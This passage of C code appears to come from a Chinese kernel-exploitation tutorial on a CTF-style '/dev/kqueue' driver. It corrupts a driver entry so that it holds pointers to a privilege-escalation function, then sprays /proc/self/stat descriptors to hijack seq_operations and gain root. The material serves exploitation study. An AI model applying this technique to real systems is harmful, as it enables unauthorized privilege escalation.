    entry->idx = 1;
    entry->data = (char *)malloc(0x20);

    buffer[0] = (size_t )root;
    buffer[1] = (size_t )root;
    buffer[2] = (size_t )root;
    buffer[3] = (size_t )root;

    memcpy(entry->data , buffer , 0x20);

    fd = open("/dev/kqueue" , O_RDWR);

    create(0x800 , MAX_DATA_SIZE);
    create(1 , MAX_DATA_SIZE);
    create(0xffffffff , MAX_DATA_SIZE);
    
    edit(2 , 0 , "aaaaaaaaaaaaaaaa");
    edit(1 , 1 , (char *)entry); 
    // 相当于修改 2 1

    for (int i =0;i<0x100;i++){
        seq_fd[i] =  open("/proc/self/stat", O_RDONLY);
    }

    // getchar();
    save(2 , 2 , 0x20) ; 

    info("(size_t )root" , (size_t )root);

    for (int i =0;i<0x100;i++){
        read(seq_fd[i] , buffer , 0x10);
    }
}

```

![image-20221024141432723](%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024141432723.png)
